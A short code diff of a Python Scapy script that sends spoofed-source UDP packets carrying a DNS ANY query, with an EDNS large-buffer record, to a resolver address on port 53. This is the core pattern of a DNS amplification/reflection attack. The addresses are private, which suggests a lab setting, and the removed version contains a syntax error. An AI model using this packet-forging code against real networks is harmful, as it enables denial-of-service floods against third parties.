@@ -1,9 +1,3 @@
 from scapy.all import *
 import time
-
-A= "192.168.30.1"
-B= "192.168.20.1"
-D= DNS(rd=1,qd=DNSQR(qname="rapid7.com",qtype="ANY",qclass="IN")),count=100,loop=1)
-
-spoofed_packet = IP(src=A, dst=B) / UDP(sport=16863, dport=53) / D
-send(spoofed_packet, count=10)
+send(IP(src="192.168.30.1", dst="192.168.20.1") / UDP(sport=16863, dport=53) / "\xc4\x75\x01\x00\x00\x01\x00\x00\x00\x00\x00\x01\x00\x00\xff\x00\x01\x00\x00\x29\x23\x28\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00", count=10)
